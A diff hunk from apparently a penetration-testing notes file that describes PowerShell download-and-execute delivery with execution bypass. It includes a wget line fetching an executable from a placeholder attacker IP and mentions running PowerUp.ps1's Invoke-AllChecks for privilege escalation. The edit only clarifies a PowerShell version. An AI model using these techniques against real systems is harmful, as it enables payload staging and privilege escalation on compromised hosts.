@@ -23,7 +23,7 @@ Powershell Download and Execute script with execution bypass and Powershell Vers
 
 To execute the payload upon delivery add the command you want Powershell to run at the end of the script.  A good example of this is using the PowerUp.ps1 privilege escalation script.  The command Invoke-AllChecks can be added to the end of the script so that it is ran as soon as it is collected from the attackers machine.  If you only want to download the script then execute later the `powershell Import-Module .\PowershellScript.ps1` command can be used.  This will then allow you to run the commands within the script manaully.
 
-In later versions of Powershell wget can be used to download a file:
+In Powershell version 3 and above, wget can be used to download a file:
 
 `wget "http://<ip address>:<port>/FileToDownload.exe" -OutFile SomeOutputFileName.exe `
 
